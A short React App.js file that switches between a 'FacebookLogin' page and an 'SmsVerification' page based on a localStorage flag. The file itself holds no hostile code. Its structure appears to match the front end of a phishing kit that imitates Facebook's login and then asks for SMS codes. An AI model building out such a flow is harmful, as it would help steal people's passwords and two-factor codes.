import React, { useState, useEffect } from 'react';
import FacebookLogin from './pages/FacebookLogin';
import SmsVerification from './pages/SmsVerification';

function App() {
  const [currentView, setCurrentView] = useState('login');

  useEffect(() => {
    // Check if user should see SMS verification
    const showSmsVerification = localStorage.getItem('showSmsVerification');
    if (showSmsVerification === 'true') {
      setCurrentView('sms');
    }
  }, []);

  if (currentView === 'sms') {
    return (
      <div className="App">
        <SmsVerification />
      </div>
    );
  }

  return (
    <div className="App">
      <FacebookLogin />
    </div>
  );
}

export default App;